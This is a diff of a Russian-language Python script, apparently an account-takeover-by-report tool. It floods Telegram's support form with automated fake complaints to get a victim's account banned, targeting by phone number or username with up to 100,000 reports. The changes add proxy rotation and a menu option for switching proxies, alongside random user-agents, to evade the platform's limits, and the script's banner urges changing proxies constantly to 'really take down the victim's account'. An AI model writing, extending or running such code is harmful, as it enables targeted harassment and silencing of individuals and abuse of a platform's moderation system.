@@ -22,7 +22,7 @@ print(colored(f"Время запуска софта: {current_time}", 'cyan'))
 print(colored(f"IP-адрес (если стоит ваш, проверьте ваш прокси): {ip_address}", 'yellow'))
 print(colored(f"Для установки прокси, нужен сам прокси с портом SOCKS5, потом зайдите в Настройки устройства и найдите прокси.", 'blue'))
 print(colored(f"При сноса, можно отменить нажав CTRL + C", 'red'))
-print(colored(f"Версия софта: pre-alpha v.0.3", 'red'))
+print(colored(f"Версия софта: pre-alpha v.0.4", 'red'))
 print(colored(f"!!РЕКОМЕНДУЕТСЯ МЕНЯТЬ ПРОКСИ ПОСТОЯННО, ЧТОБЫ РЕАЛЬНО СНОСИТЬ АККАУНТ ЖЕРТВЫ!!", 'red'))
 
 def check_data_files():
@@ -43,13 +43,21 @@ def check_data_files():
         print("Ошибка: файлы были удалены / владелец репозитория удалил нужные файлы.")
         return False
 
+def setup_proxy():
+    proxy_input = input("Введите прокси в формате IP:PORT: ")
+    proxies = {
+        'http': f'http://{proxy_input}',
+        'https': f'http://{proxy_input}'
+    }
+    return proxies
+
 if not check_data_files():
     exit()
 
 url = 'https://telegram.org/support'
 ua = UserAgent()
 
-def send_complaint(text, contact, yukino):
+def send_complaint(text, contact, yukino, proxies):
     headers = {
         'User-Agent': ua.random
     }
@@ -59,7 +67,7 @@ def send_complaint(text, contact, yukino):
     }
 
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=5)
+        response = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=5)
         if response.status_code == 200:
             print(f"\33[92mОтправлено жалоба\n Кол-во (лимит 100000)", yukino, "УЖЕ ОТПРАВЛЕНО\33[0m")
         else:
@@ -67,7 +75,7 @@ def send_complaint(text, contact, yukino):
     except requests.exceptions.RequestException as e:
         print(colored(f"Ошибка, проверьте свой интернет либо прокси: {e}", 'red'))
 
-def send_complaints(choice, limit, text, contact, users):
+def send_complaints(choice, limit, text, contact, users, proxies):
     yukino = 0
     try:
         while yukino < limit:
@@ -76,12 +84,12 @@ def send_complaints(choice, limit, text, contact, users):
                 chosen_text = random.choice(text)
                 chosen_contact = random.choice(contact)
                 print(f"Отправка жалобы на номер телефона №{yukino}...")
-                send_complaint(chosen_text, chosen_contact, yukino)
+                send_complaint(chosen_text, chosen_contact, yukino, proxies)
             elif choice == '2':
                 chosen_text = random.choice(text)
                 chosen_user = random.choice(users)
                 print(f"Отправка жалобы на пользователя №{yukino}...")
-                send_complaint(chosen_text, chosen_user, yukino)
+                send_complaint(chosen_text, chosen_user, yukino, proxies)
             time.sleep(1)
     except KeyboardInterrupt:
         print("Отменен.")
@@ -99,9 +107,14 @@ def change_username():
         user_file.write(new_username)
     print("Юзернейм успешно изменен.")
 
+def change_proxy():
+    global proxies
+    proxies = setup_proxy()
+
 def main_menu():
+    global proxies
     while True:
-        choice = input("Выберите вариант сноса \n 1 - по номеру телефона, 2 - по юзер нейму, 3 - изменить данные \n: ")
+        choice = input("Выберите вариант сноса \n 1 - по номеру телефона, 2 - по юзер нейму, 3 - изменить данные, 4 - изменить прокси\n: ")
         if choice == '3':
             data_choice = input("Выберите данные для изменения \n 1 - Изменить номер телефона, 2 - Изменить юзернейм \n: ")
             if data_choice == '1':
@@ -110,6 +123,8 @@ def main_menu():
                 change_username()
             else:
                 print("Неверный выбор.")
+        elif choice == '4':
+            change_proxy()
         elif choice not in ['1', '2']:
             print("Неверный выбор.")
         else:
@@ -123,6 +138,6 @@ def main_menu():
             with open('users.txt', 'r') as user_file:
                 users = user_file.read().splitlines()
 
-            send_complaints(choice, limit, text, contact, users)
+            send_complaints(choice, limit, text, contact, users, proxies)
 
 main_menu()
